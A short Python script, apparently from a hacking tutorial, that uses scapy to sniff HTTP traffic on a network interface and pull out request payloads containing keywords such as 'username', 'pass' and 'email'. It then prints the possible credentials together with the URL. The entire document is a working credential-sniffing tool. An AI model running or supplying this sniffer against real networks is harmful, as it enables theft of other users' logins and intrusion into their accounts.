#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http
# pip install scapy_http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "pass", "email", "e-mail"]
        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        login_info = get_login_info(packet)
        url = get_url(packet)
        print(login_info)
        if login_info:
            print("\n\n[+] I think I get a possible username/password at" + url + " > " + login_info + "\n\n")

sniff("eth0")